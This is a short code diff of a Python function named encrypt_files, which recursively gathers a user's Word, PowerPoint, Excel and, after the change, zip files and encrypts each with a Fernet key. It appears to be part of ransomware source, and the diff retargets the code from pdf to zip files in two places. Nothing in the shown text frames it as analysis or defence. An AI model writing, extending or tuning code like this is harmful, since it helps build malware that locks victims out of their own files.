@@ -27,7 +27,7 @@ def encrypt_files():
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.ppt', recursive=True) \
                       + glob.glob(path + '/**/*.xlsx', recursive=True) \
-                      + glob.glob(path + '/**/*.pdf', recursive=True):
+                      + glob.glob(path + '/**/*.zip', recursive=True):
             # Start encryption
             k = key
             f = Fernet(k)
@@ -62,7 +62,7 @@ def encrypt_files():
                       + glob.glob(path + '/**/*.docx', recursive=True) \
                       + glob.glob(path + '/**/*.ppt', recursive=True) \
                       + glob.glob(path + '/**/*.xlsx', recursive=True) \
-                      + glob.glob(path + '/**/*.pdf', recursive=True):
+                      + glob.glob(path + '/**/*.zip', recursive=True):
             # Start encryption
             k = key
             f = Fernet(k)
